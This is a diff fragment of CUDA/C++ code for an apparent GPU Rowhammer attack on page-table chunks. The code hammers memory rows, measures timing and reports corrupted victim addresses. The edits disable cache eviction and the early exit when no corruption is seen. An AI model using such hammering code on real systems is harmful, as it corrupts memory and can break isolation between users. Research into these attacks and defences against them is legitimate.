@@ -33,12 +33,12 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
     std::cout << "Waiting for Identifing Info Intialization... " << '\n';
 
     for (uint64_t i = 0; i < num_alloc_init - 50  - (35) - 4; i += 1)
-    {
         memset_ptr<<<1, 1>>>(first_ptc_ptrs[i] + 64 * 1024, 2 * 1024 * 1024 - 64 * 1024);
-    }
 
     // memset_ptr<<<1, 1>>>(agg_ptr + 64 * 1024, 2 * 1024 * 1024 - 64 * 1024);
     cudaDeviceSynchronize();
+    // for (uint64_t i = 0; i < num_alloc_init - 50  - (35) - 4; i += 1)
+    //     *(first_ptc_ptrs[i]) = 'a';
 
     // std::cout << std::hex << (void*)agg_ptr << '\n';
     std::cout << std::dec;
@@ -70,8 +70,8 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
 
     for (int j = 0; j < 100; j++)
     {
-        evict_L2cache ((uint8_t *)evict_ptr);
-        cudaDeviceSynchronize ();
+        // evict_L2cache ((uint8_t *)evict_ptr);
+        // cudaDeviceSynchronize ();
         /* Start the hammering and measure the time */
         uint64_t time = start_multi_warp_hammer (
             agg_row_list, agg_vec, it, n, k, agg_vec.size(), delay, period);
@@ -120,11 +120,11 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
     {
         std::cout << "Corrupted: " << corrupt_id << ' ' << (void*) corrupted_addr << ". Victim: "<< (void*)victim_addr << '\n';
     }
-    else
-    {
-        std::cout << "No Corruption Observed." << '\n';
-        return false;
-    }
+    // else
+    // {
+    //     std::cout << "No Corruption Observed." << '\n';
+    //     return false;
+    // }
 
     if (out_first_ptc_ptrs)
         *out_first_ptc_ptrs = first_ptc_ptrs;
